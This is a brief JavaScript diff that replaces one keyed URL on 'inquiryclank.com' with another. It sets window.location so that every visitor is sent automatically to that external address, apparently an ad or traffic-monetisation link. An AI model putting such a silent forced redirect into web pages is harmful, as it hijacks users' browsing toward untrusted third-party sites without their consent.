@@ -1,6 +1,6 @@
 var dataUrl = [
 
-  'https://inquiryclank.com/f2mnb80ep?key=c90b9940c19a9a3b1f8865dc628e8eca'
+  'https://inquiryclank.com/pgy7h6cw?key=756a1bbb1d4d12b56cb50d97b90b7a51'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
